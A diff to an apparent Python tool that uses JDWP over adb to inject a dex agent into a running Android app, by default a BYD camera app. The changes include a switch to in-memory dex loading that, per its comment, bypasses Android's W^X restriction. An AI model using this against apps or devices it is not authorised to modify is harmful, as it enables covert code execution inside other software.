@@ -17,7 +17,7 @@ PKG      = sys.argv[2]
 DEX      = sys.argv[3]                                   # path ON DEVICE (world-readable, e.g. /data/local/tmp/HudPrivAgent.dex)
 ENTRYCLS = sys.argv[4] if len(sys.argv) > 4 else "com.zbyd.hudpriv.HudPrivAgent"
 ENTRYMTD = sys.argv[5] if len(sys.argv) > 5 else "start"
-OPTDIR   = "/data/local/tmp/zbyd-odex"
+OPTDIR   = "/data/data/%s/code_cache/zbyd-odex" % PKG   # app-WRITABLE (the loaded app owns it); /data/local/tmp is shell-owned -> odex fails
 PORT     = 7720
 POKE     = sys.argv[6] if len(sys.argv) > 6 else (PKG + "/.CameraAutoStudyTest" if PKG == "com.byd.cameraautostudy" else None)
 
@@ -121,6 +121,7 @@ class JDWP:
                 kind = body[o]; o += 1
                 req = struct.unpack(">I", body[o:o+4])[0]; o += 4
                 tid = int.from_bytes(body[o:o+self.osz], "big"); o += self.osz
+                sys.stderr.write("[evt] composite kind=%d req=%d\n" % (kind, req))
                 if kind == 2:                                  # BREAKPOINT
                     return tid
 
@@ -140,6 +141,8 @@ class JDWP:
         d = self.cmd(3, 3, data)
         # returnValue: tagged value, then exception objectID
         tagv = d[0]; val = int.from_bytes(d[1:1+self.osz], "big")
+        exc = int.from_bytes(d[1+self.osz+1:1+self.osz+1+self.osz], "big")
+        if exc: sys.stderr.write("[exc] invoke_static threw %s\n" % self.exc_sig(exc))
         return val
 
     def invoke_instance(self, obj, cid, tid, mid, args):
@@ -149,7 +152,19 @@ class JDWP:
         data += struct.pack(">I", 1)
         d = self.cmd(9, 6, data)
         val = int.from_bytes(d[1:1+self.osz], "big")
+        exc = int.from_bytes(d[1+self.osz+1:1+self.osz+1+self.osz], "big")
+        if exc: sys.stderr.write("[exc] invoke_instance threw %s\n" % self.exc_sig(exc))
         return val
+
+    def exc_sig(self, objid):
+        try:
+            r = self.cmd(9, 1, self.oid(objid))               # ObjectReference.ReferenceType -> tag + refTypeID
+            rt = int.from_bytes(r[1:1+self.osz], "big")
+            s = self.cmd(2, 1, self.oid(rt))                  # ReferenceType.Signature -> string
+            n = struct.unpack(">I", s[:4])[0]
+            return s[4:4+n].decode("utf-8", "replace")
+        except Exception as e:
+            return "obj=%d (sig fetch failed: %s)" % (objid, e)
 
     def new_instance(self, cid, tid, mid, args):
         data = self.oid(cid) + tid.to_bytes(self.tsz, "big") + mid.to_bytes(self.msz, "big")
@@ -161,12 +176,17 @@ class JDWP:
         val = int.from_bytes(d[1:1+self.osz], "big")
         return val
 
+    def array_new(self, arr_typeid, length):
+        d = self.cmd(4, 1, self.oid(arr_typeid) + struct.pack(">I", length))   # ArrayType.NewInstance
+        return int.from_bytes(d[1:1+self.osz], "big")
+
     def reflected_type(self, classobj):
         d = self.cmd(17, 1, self.oid(classobj))
         tag = d[0]; tid = int.from_bytes(d[1:1+self.osz], "big")
         return tag, tid
 
 TAG_OBJECT = 76  # 'L'
+TAG_ARRAY  = 91  # '['
 
 def main():
     # 1. ensure app running, get pid (poke to generate looper traffic)
@@ -178,7 +198,7 @@ def main():
     if not pid:
         print("[x] %s not running and could not be started" % PKG); sys.exit(1)
     print("[*] %s pid=%s" % (PKG, pid))
-    adb("shell", "mkdir", "-p", OPTDIR)
+    adb("shell", "run-as", PKG, "mkdir", "-p", OPTDIR)   # app-owned odex dir
     adb("forward", "tcp:%d" % PORT, "jdwp:%s" % pid)
     s = socket.create_connection(("127.0.0.1", PORT), timeout=15)
     j = JDWP(s); j.idsizes()
@@ -191,33 +211,56 @@ def main():
     rid = j.set_breakpoint(tag, hcid, dmid)
     j.resume()
     print("[*] breakpoint set, poking app for looper traffic ...")
-    # poke repeatedly so the main thread dispatches messages
-    for _ in range(8):
+    # poke so the MAIN thread dispatches a message. Config change (uimode toggle) -> onConfigurationChanged
+    # on every app's main thread via Handler -> reliable Handler.dispatchMessage. Also re-deliver intent w/ a
+    # varying extra so onNewIntent fires even on singleTop.
+    pokes = [
+        ("shell", "cmd", "uimode", "night", "yes"),
+        ("shell", "cmd", "uimode", "night", "no"),
+    ]
+    for i in range(10):
+        if POKE: adb("shell", "am", "start", "-n", POKE, "--ez", "zbyd", "true", "-a", "android.intent.action.VIEW", "-d", "zbyd://%d" % i)
+        adb(*pokes[i % len(pokes)])
         adb("shell", "input", "keyevent", "KEYCODE_WAKEUP")
-        if POKE: adb("shell", "am", "start", "-n", POKE)
         try:
-            j.tid = j.wait_breakpoint(rid, timeout=4)
+            j.tid = j.wait_breakpoint(rid, timeout=6)
             break
         except socket.timeout:
-            continue
+            print("[.] poke %d: no breakpoint yet" % i); continue
     else:
         print("[x] breakpoint never hit (app idle?). Try interacting with it on screen."); sys.exit(2)
     print("[*] thread suspended tid=%d" % j.tid)
     j.clear_breakpoint(rid)
 
-    # 3. build args: dexPath, optDir, parent loader
-    sp = j.create_string(DEX); op = j.create_string(OPTDIR)
-    loader = j.system_classloader()
-    print("[*] sysClassLoader=%d" % loader)
+    # 3. parent = APP classloader (ActivityThread.currentApplication().getClassLoader())
+    _, atcid = j.classes_by_sig("Landroid/app/ActivityThread;")
+    cam = next(mid for (mid, sig) in j.methods(atcid)["currentApplication"] if sig == "()Landroid/app/Application;")
+    app = j.invoke_static(atcid, j.tid, cam, [])
+    _, ctxcid = j.classes_by_sig("Landroid/content/Context;")
+    gcl = next(mid for (mid, sig) in j.methods(ctxcid)["getClassLoader"] if sig == "()Ljava/lang/ClassLoader;")
+    loader = j.invoke_instance(app, ctxcid, j.tid, gcl, [])
+    print("[*] appClassLoader=%d (app=%d)" % (loader, app))
 
-    # 4. new DexClassLoader(String,String,String,ClassLoader) -- pass null 3rd (libPath)
-    _, dclcid = j.classes_by_sig("Ldalvik/system/DexClassLoader;")
-    dclm = j.methods(dclcid)
-    ctor = next(mid for (mid, sig) in dclm["<init>"]
-                if sig == "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V")
-    dcl = j.new_instance(dclcid, j.tid, ctor,
-                         [(TAG_OBJECT, sp), (TAG_OBJECT, op), (TAG_OBJECT, 0), (TAG_OBJECT, loader)])
-    print("[*] DexClassLoader=%d" % dcl)
+    # 4. Read the RAW dex bytes as DATA (allowed) and load from MEMORY -> bypasses the API29+ W^X block
+    #    that refuses to *execute* dex from an app-writable file ("ClassLoader referenced unknown path").
+    sp = j.create_string(DEX)                                          # DEX must be a raw .dex (not .jar) for InMemoryDexClassLoader
+    _, strArrTid = j.classes_by_sig("[Ljava/lang/String;")
+    emptyArr = j.array_new(strArrTid, 0)
+    _, pathscid = j.classes_by_sig("Ljava/nio/file/Paths;")
+    getp = next(mid for (mid, sig) in j.methods(pathscid)["get"] if sig == "(Ljava/lang/String;[Ljava/lang/String;)Ljava/nio/file/Path;")
+    path = j.invoke_static(pathscid, j.tid, getp, [(TAG_OBJECT, sp), (TAG_ARRAY, emptyArr)])
+    _, filescid = j.classes_by_sig("Ljava/nio/file/Files;")
+    rab = next(mid for (mid, sig) in j.methods(filescid)["readAllBytes"] if sig == "(Ljava/nio/file/Path;)[B")
+    dexbytes = j.invoke_static(filescid, j.tid, rab, [(TAG_OBJECT, path)])
+    print("[*] read dex bytes -> byte[]=%d" % dexbytes)
+    _, bbcid = j.classes_by_sig("Ljava/nio/ByteBuffer;")
+    wrap = next(mid for (mid, sig) in j.methods(bbcid)["wrap"] if sig == "([B)Ljava/nio/ByteBuffer;")
+    bb = j.invoke_static(bbcid, j.tid, wrap, [(TAG_ARRAY, dexbytes)])
+    _, dclcid = j.classes_by_sig("Ldalvik/system/InMemoryDexClassLoader;")
+    ctor = next(mid for (mid, sig) in j.methods(dclcid)["<init>"]
+                if sig == "(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V")
+    dcl = j.new_instance(dclcid, j.tid, ctor, [(TAG_OBJECT, bb), (TAG_OBJECT, loader)])
+    print("[*] InMemoryDexClassLoader=%d" % dcl)
 
     # 5. loadClass(entry) -> Class object
     clsname = j.create_string(ENTRYCLS)
@@ -226,6 +269,9 @@ def main():
     lc = next(mid for (mid, sig) in clm["loadClass"] if sig == "(Ljava/lang/String;)Ljava/lang/Class;")
     klass = j.invoke_instance(dcl, clcid, j.tid, lc, [(TAG_OBJECT, clsname)])
     print("[*] loaded %s -> classObj=%d" % (ENTRYCLS, klass))
+    if not klass:
+        j.resume(); adb("forward", "--remove", "tcp:%d" % PORT)   # don't pass null class to JDWP (CheckJNI aborts the app)
+        print("[x] loadClass returned null -> dex not loaded. Aborting cleanly (app preserved)."); sys.exit(3)
 
     # 6. ReflectedType(classObj) -> typeID; find entry method; ClassType.InvokeMethod
     _, etid = j.reflected_type(klass)
